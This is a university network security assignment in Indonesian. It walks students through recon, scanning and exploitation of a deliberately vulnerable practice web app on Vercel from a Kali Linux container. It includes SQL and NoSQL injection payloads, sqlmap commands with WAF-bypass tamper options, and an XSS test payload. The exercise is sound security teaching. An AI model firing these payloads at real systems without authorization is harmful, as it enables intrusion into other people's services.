### **Tugas Network Security: Simulasi Serangan dari Kali Linux Container ke Target Publik**

Tujuan utama tugas ini adalah mensimulasikan skenario dunia nyata di mana penyerang (Kali Linux) melakukan pengujian penetrasi terhadap aplikasi web yang berjalan di platform cloud (Vercel) secara **black-box** (tanpa mengetahui kode sumber di baliknya).

Gunakan Template ini untuk pengumpulan tugas: https://docs.google.com/document/d/1wN5IxH3eungsvaZVP67xxS8DcsW7USBlHjlRb5jWMLw/edit?usp=sharing

#### **🎯 Tujuan Pembelajaran**
1.  Mahir menyiapkan lingkungan serangan terisolasi dengan Docker.
2.  Memahami tantangan menyerang target publik di internet (adanya WAF, CDN, dll).
3.  Menggunakan alat-alat pentesting standar dari dalam container Kali Linux untuk target eksternal.
4.  Menganalisis perbedaan perilaku aplikasi di lingkungan pengembangan (lokal) vs produksi (Vercel).

---

### **📋 Langkah-Langkah Tugas**

#### **Fase 1: Setup Lingkungan Penyerang (Kali Linux Container)**

**1. Jalankan Container Kali Linux**
*   Di mesin **host**, jalankan container Kali Linux yang terhubung ke internet.
    ```bash
    # Jalankan container Kali Linux dengan akses jaringan host (agar bisa mengakses internet)
    docker run -it --rm --name kali-attacker kalilinux/kali-rolling /bin/bash
    ```
    *Catatan:* Tidak perlu membuat jaringan khusus karena targetnya di internet.

**2. Update dan Install Alat di Kali Container**
*   Setelah masuk ke shell container Kali, update dan install alat yang diperlukan.
    ```bash
    apt update && apt upgrade -y
    apt install -y nmap sqlmap curl wget dirb nikto whatweb dnsutils
    ```

**3. Verifikasi Koneksi Internet**
*   Pastikan container bisa mengakses internet.
    ```bash
    ping -c 4 google.com
    curl -I https://hackable-pentest.vercel.app/
    ```

---

#### **Fase 2: Fase Pengintaian (Reconnaissance)**

**4. Information Gathering dengan WhatWeb**
*   Gunakan WhatWeb untuk mendeteksi teknologi yang digunakan oleh target.
    ```bash
    whatweb https://hackable-pentest.vercel.app/
    ```
    **Analisis:** Teknologi apa yang terdeteksi? Apakah ada informasi tentang web server, framework JavaScript, atau header keamanan?

**5. Analisis Header HTTP**
*   Gunakan `curl` untuk melihat header respons secara detail.
    ```bash
    curl -I -L https://hackable-pentest.vercel.app/
    ```
    **Analisis:** Perhatikan header seperti `Server`, `X-Powered-By`, `Set-Cookie`, dan header keamanan seperti `X-Frame-Options` atau `Content-Security-Policy`. Apakah ada informasi yang bocor?

**6. DNS Enumeration**
*   Dapatkan informasi DNS tentang target.
    ```bash
    # Cari alamat IP di belakang domain
    dig hackable-pentest.vercel.app
    
    # Cari catatan DNS lainnya
    nslookup hackable-pentest.vercel.app
    ```
    **Analisis:** Berapa alamat IP yang ditemukan? Apakah menggunakan CDN? Catatan DNS apa saja yang ada?

**7. Directory Bruteforcing dengan Dirb**
*   Cari direktori dan file tersembunyi di server.
    ```bash
    dirb https://hackable-pentest.vercel.app/
    ```
    **Analisis:** Apakah ada direktori atau file menarik yang ditemukan (seperti `/api`, `/admin`, `/backup`)?

---

#### **Fase 3: Fase Pemindaian Kerentanan**

**8. Vulnerability Scanning dengan Nikto**
*   Gunakan Nikto untuk memindai kerentanan umum pada web server.
    ```bash
    nikto -h https://hackable-pentest.vercel.app/
    ```
    **Analisis:** Kerentanan apa yang dilaporkan Nikto? Apakah ada file atau konfigurasi berbahaya yang terdeteksi?

**9. Port Scanning Terbatas dengan Nmap**
*   Lakukan pemindaian port terbatas pada server (ingat etika!).
    ```bash
    nmap -p 80,443 --script http-title,http-server-header hackable-pentest.vercel.app
    ```
    **Analisis:** Port apa yang terbuka? Informasi apa yang didapat dari skrip Nmap?

---

#### **Fase 4: Fase Eksploitasi (Pengujian Manual & Otomatis)**

**10. Eksplorasi Endpoint API**
*   Berdasarkan pengalaman dari repositori, coba akses endpoint yang mungkin ada.
    ```bash
    # Coba akses endpoint login
    curl -X POST https://hackable-pentest.vercel.app/api/login -d "username=test&password=test"
    
    # Coba akses endpoint lain yang mungkin
    curl https://hackable-pentest.vercel.app/api/users
    curl https://hackable-pentest.vercel.app/api/comments
    ```
    **Analisis:** Apakah endpoint-endpoint tersebut ada? Apa respons yang diberikan?

**11. Uji SQL Injection Manual**
*   Coba payload SQL Injection sederhana pada endpoint login.
    ```bash
    # Payload dasar
    curl -X POST https://hackable-pentest.vercel.app/api/login -d "username=admin' OR '1'='1' -- -&password=test"
    
    # Payload dengan komentar
    curl -X POST https://hackable-pentest.vercel.app/api/login -d "username=admin' -- -&password=test"
    ```
    **Analisis:** Bandingkan respons dengan percobaan sebelumnya. Apakah ada perbedaan pesan error? Apakah berhasil bypass?

**12. Uji NoSQL Injection (Alternatif)**
*   Karena Vercel sering menggunakan database NoSQL seperti MongoDB, coba payload NoSQL.
    ```bash
    # Payload NoSQL Injection untuk MongoDB
    curl -X POST https://hackable-pentest.vercel.app/api/login -d "username=admin&password[%24ne]=1"
    ```
    **Analisis:** Apakah ada respons yang berbeda?

**13. Automated SQL Injection dengan SQLMap**
*   Jalankan SQLMap dengan konfigurasi yang sesuai untuk target publik.
    ```bash
    # Uji coba dasar dengan level rendah
    sqlmap -u "https://hackable-pentest.vercel.app/api/login" --data="username=admin&password=test" --level=1 --risk=1 --batch --random-agent
    
    # Jika tidak berhasil, coba dengan teknik yang lebih spesifik
    sqlmap -u "https://hackable-pentest.vercel.app/api/login" --data="username=admin&password=test" --dbms=mysql --technique=U --batch
    ```
    **Analisis:** Apakah SQLMap berhasil mendeteksi kerentanan? Jika tidak, apa kemungkinan penyebabnya?

---

#### **Fase 5: Analisis Perbandingan dengan Kode Sumber**

**14. Studi Kode dari Repositori (di Host)**
*   **Kembali ke mesin host**, clone repositori **Hackable-Pentest** jika belum.
    ```bash
    git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Hackable-Pentest.git
    cd Hackable-Pentest
    ```
*   Analisis struktur kode, terutama:
    *   File `init.sql`: Skema database dan data awal
    *   File di direktori `server/api/`: Logika endpoint
    *   File `docker-compose.yml`: Konfigurasi infrastruktur

**15. Identifikasi Perbedaan**
*   **Tugas:** Bandingkan perilaku target publik dengan apa yang Anda lihat di kode sumber.
    *   Apakah endpoint yang ada di kode (`/api/login`, `/api/comments`) tersedia di target publik?
    *   Apakah respons error dari target publik sama dengan yang seharusnya (berdasarkan kode)?
    *   Apakah ada mekanisme keamanan tambahan di Vercel (seperti rate limiting atau WAF)?

---

#### **Fase 6: Dokumentasi dan Pelaporan**

**16. Susun Laporan Praktikum**
Buat laporan lengkap dalam format PDF yang mencakup:

1.  **Pendahuluan**
    *   Tujuan praktikum
    *   Deskripsi target: `https://hackable-pentest.vercel.app/`

2.  **Metodologi**
    *   Alat-alat yang digunakan (WhatWeb, curl, dig, dirb, nikto, nmap, sqlmap)
    *   Lingkungan pengujian (Kali Linux container)

3.  **Hasil dan Analisis per Fase**
    *   **Fase Pengintaian:** Screenshot hasil WhatWeb, curl, dig, dirb. Analisis temuan.
    *   **Fase Pemindaian:** Screenshot hasil Nikto dan Nmap. Analisis kerentanan potensial.
    *   **Fase Eksploitasi:** Screenshot hasil uji manual dan SQLMap. Analisis keberhasilan/kegagalan.
    *   **Analisis Perbandingan:** Tabel perbandingan antara perilaku target publik dengan yang diharapkan dari kode sumber.

4.  **Kesimpulan dan Rekomendasi**
    *   Apakah aplikasi di Vercel rentan? Mengapa bisa berbeda dengan versi lokal?
    *   Berikan 3 rekomendasi keamanan untuk pengembang aplikasi ini.

---

### **📊 Tabel Perbandingan Target Lokal vs Publik**

| Aspek | Target Lokal (Docker) | Target Publik (Vercel) |
|-------|----------------------|------------------------|
| **Akses** | `http://localhost:3000` | `https://hackable-pentest.vercel.app` |
| **Database** | MySQL (dari konfigurasi) | Tidak diketahui (kemungkinan NoSQL) |
| **Kerentanan Diketahui** | SQL Injection (dari kode) | Perlu diuji |
| **Keamanan Tambahan** | Minimal | Kemungkinan ada WAF/CDN |
| **Respons Error** | Detail (debug) | Umum (production mode) |

---

### **🔍 Tantangan Lanjutan (Opsional)**

1.  **Bypass WAF:** Jika SQLMap mendeteksi adanya WAF, coba gunakan teknik bypass seperti `--tamper=space2comment` atau `--random-agent`.
2.  **XSS Discovery:** Coba injeksikan payload XSS sederhana ke parameter yang mungkin rentan (gunakan `</body><script>alert(1)</script>` di parameter input).
3.  **Rate Limit Testing:** Uji apakah ada mekanisme rate limiting dengan menjalankan script bash sederhana yang melakukan 100 request berturut-turut.

### **⚠️ Catatan Penting**

*   **Etika:** Target `https://hackable-pentest.vercel.app/` diasumsikan aman untuk diuji karena disediakan untuk praktik. Namun, selalu patuhi prinsip *responsible disclosure*.
*   **Hukum:** Menyerang server publik tanpa izin adalah ilegal. Pastikan target ini benar-benar milik Anda atau untuk tujuan pendidikan.
*   **Intensitas:** Jangan menjalankan alat seperti dirb atau sqlmap dengan intensitas tinggi karena bisa dianggap sebagai serangan DoS.
